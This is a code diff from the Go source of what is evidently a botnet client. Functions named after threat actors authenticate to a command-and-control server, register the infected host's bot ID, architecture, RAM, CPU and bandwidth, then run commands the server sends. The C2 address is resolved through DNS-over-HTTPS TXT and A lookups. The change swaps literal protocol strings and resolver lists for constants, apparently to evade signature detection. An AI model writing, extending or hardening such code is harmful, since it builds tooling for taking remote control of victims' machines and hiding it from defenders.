@@ -153,7 +153,7 @@ func revilUplinkCached() float64 {
 func revilUplink() float64 {
 	// Small test URLs (fast CDNs)
 	testURLs := []string{
-		"http://speed.cloudflare.com/__down?bytes=100000",
+		speedTestURL,
 	}
 
 	client := &http.Client{
@@ -218,12 +218,12 @@ func anonymousSudan(conn net.Conn) {
 	}
 	challengeMsg = strings.TrimSpace(challengeMsg)
 	deoxys("anonymousSudan: Received: %s", challengeMsg)
-	if !strings.HasPrefix(challengeMsg, "AUTH_CHALLENGE:") {
+	if !strings.HasPrefix(challengeMsg, protoChallenge) {
 		deoxys("anonymousSudan: Invalid challenge format, closing")
 		conn.Close()
 		return
 	}
-	challenge := strings.TrimPrefix(challengeMsg, "AUTH_CHALLENGE:")
+	challenge := strings.TrimPrefix(challengeMsg, protoChallenge)
 	challenge = strings.TrimSpace(challenge)
 	deoxys("anonymousSudan: Challenge extracted: %s", challenge)
 	response := hafnium(challenge, syncToken)
@@ -231,7 +231,7 @@ func anonymousSudan(conn net.Conn) {
 	conn.Write([]byte(response + "\n"))
 	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
 	authResult, err := reader.ReadString('\n')
-	if err != nil || strings.TrimSpace(authResult) != "AUTH_SUCCESS" {
+	if err != nil || strings.TrimSpace(authResult) != protoSuccess {
 		deoxys("anonymousSudan: Auth failed: err=%v, result=%s", err, strings.TrimSpace(authResult))
 		conn.Close()
 		return
@@ -240,7 +240,7 @@ func anonymousSudan(conn net.Conn) {
 	// Use pre-cached metadata so REGISTER is sent instantly (no speed test delay).
 	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB, CPU: %d cores, Proc: %s, Uplink: %.2f Mbps",
 		cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)
-	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d:%d:%s:%.2f\n",
+	conn.Write([]byte(fmt.Sprintf(protoRegFmt,
 		buildTag, cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)))
 	deoxys("anonymousSudan: Entering command loop...")
 	for {
@@ -252,15 +252,15 @@ func anonymousSudan(conn net.Conn) {
 		}
 		command = strings.TrimSpace(command)
 		deoxys("anonymousSudan: Received command: %s", command)
-		if command == "PING" {
+		if command == protoPing {
 			deoxys("anonymousSudan: Responding to PING")
-			conn.Write([]byte("PONG\n"))
+			conn.Write([]byte(protoPong))
 			continue
 		}
 		deoxys("anonymousSudan: Executing command via blackEnergy...")
 		if err := blackEnergy(conn, command); err != nil {
 			deoxys("anonymousSudan: Command error: %v", err)
-			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
 		}
 	}
 	deoxys("anonymousSudan: Connection closed")
@@ -361,12 +361,8 @@ func darkrai(domain string) (string, error) {
 // Returns: C2 address string (IP:PORT) or error
 func palkia(domain string) (string, error) {
 	deoxys("palkia: Starting DoH TXT lookup for: %s", domain)
-	dohServers := []string{
-		"https://cloudflare-dns.com/dns-query",
-		"https://dns.google/dns-query",
-		"https://dns.quad9.net/dns-query",
-	}
-	for _, server := range dohServers {
+	servers := dohServers
+	for _, server := range servers {
 		dohURL := fmt.Sprintf("%s?name=%s&type=TXT", server, domain)
 		deoxys("palkia: Trying DoH server: %s", dohURL)
 		req, err := http.NewRequest("GET", dohURL, nil)
@@ -374,7 +370,7 @@ func palkia(domain string) (string, error) {
 			deoxys("palkia: Request create error: %v", err)
 			continue
 		}
-		req.Header.Set("Accept", "application/dns-json")
+		req.Header.Set("Accept", dnsJsonAccept)
 		client := &http.Client{Timeout: 10 * time.Second}
 		resp, err := client.Do(req)
 		if err != nil {
@@ -456,18 +452,15 @@ func rayquaza(domain string) (string, error) {
 	deoxys("rayquaza: System resolver failed: %v, trying DoH", err)
 
 	// Fallback to DoH A record
-	dohServers := []string{
-		"https://cloudflare-dns.com/dns-query",
-		"https://dns.google/dns-query",
-	}
-	for _, server := range dohServers {
+	servers := dohFallback
+	for _, server := range servers {
 		dohURL := fmt.Sprintf("%s?name=%s&type=A", server, domain)
 		deoxys("rayquaza: Trying DoH A record: %s", dohURL)
 		req, err := http.NewRequest("GET", dohURL, nil)
 		if err != nil {
 			continue
 		}
-		req.Header.Set("Accept", "application/dns-json")
+		req.Header.Set("Accept", dnsJsonAccept)
 		client := &http.Client{Timeout: 10 * time.Second}
 		resp, err := client.Do(req)
 		if err != nil {
